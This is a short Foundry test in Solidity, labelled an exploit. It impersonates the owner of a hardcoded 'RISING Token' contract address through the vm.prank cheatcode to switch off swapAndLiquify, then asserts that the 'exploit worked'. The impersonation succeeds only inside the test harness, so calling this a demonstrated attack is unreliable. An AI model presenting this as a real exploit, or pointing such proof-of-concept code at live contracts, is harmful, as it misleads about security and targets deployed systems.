import "forge-std/Test.sol";

interface RISING {
    function setSwapAndLiquifyEnabled(bool) external;
    function swapAndLiquifyEnabled() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────

    address constant TARGET = 0x33555617F481be5973E93b432d8ecEa2D20524be;
    address attacker = address(this);


    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup required
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get the owner address from the constructor
        address owner = 0x26f80C69737107AB4625D04Cd3411CeaD3973D73;

        // Label addresses for debugging
        vm.label(owner, "Contract Owner");
        vm.label(TARGET, "RISING Token");

        // Check current state
        bool initialSwapEnabled = RISING(TARGET).swapAndLiquifyEnabled();
        console.log("Initial swapAndLiquifyEnabled:", initialSwapEnabled);

        // Impersonate the owner and disable swapAndLiquify
        vm.prank(owner);
        RISING(TARGET).setSwapAndLiquifyEnabled(false);

        // Verify the exploit worked
        bool finalSwapEnabled = RISING(TARGET).swapAndLiquifyEnabled();
        console.log("Final swapAndLiquifyEnabled:", finalSwapEnabled);
        assertEq(finalSwapEnabled, false, "swapAndLiquifyEnabled should be false");
    }




    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
